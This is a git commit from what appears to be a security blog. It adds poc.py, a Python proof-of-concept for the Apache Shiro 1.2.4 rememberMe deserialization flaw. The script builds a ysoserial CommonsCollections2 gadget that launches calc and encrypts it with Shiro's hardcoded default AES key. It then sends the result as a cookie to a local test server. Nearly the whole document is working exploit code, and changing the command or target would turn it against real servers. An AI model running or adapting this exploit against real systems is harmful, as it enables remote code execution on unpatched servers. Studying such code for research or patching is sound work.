aa6843130e17f38f66779ed01eacf45d6b20ded6
Whippet <Whippet0@qq.com>
2020-09-07 09:53:59 +0800

    Site updated: 2020-09-07 09:53:53

---
+++ 2020/08/31/Apache Shiro 1.2.4反序列化漏洞/poc.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+# coding:utf-8
+
+from Crypto.Cipher import AES
+import traceback
+import requests
+import subprocess
+import uuid
+import base64
+
+target = "http://localhost:8080/samples_web_war/"
+jar_file = 'F:\\Penetration\\ysoserial\\ysoserial-0.0.6-SNAPSHOT-all.jar'
+cipher_key = "kPH+bIxk5D2deZiIxcaaaA=="
+
+# 创建 rememberme的值
+popen = subprocess.Popen(['java','-jar',jar_file, "CommonsCollections2", "calc"],
+                        stdout=subprocess.PIPE)
+BS = AES.block_size
+pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+mode = AES.MODE_CBC
+iv = uuid.uuid4().bytes
+encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)
+file_body = pad(popen.stdout.read())
+base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+
+# 发送request
+try:
+    r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)
+except:
+    traceback.print_exc()
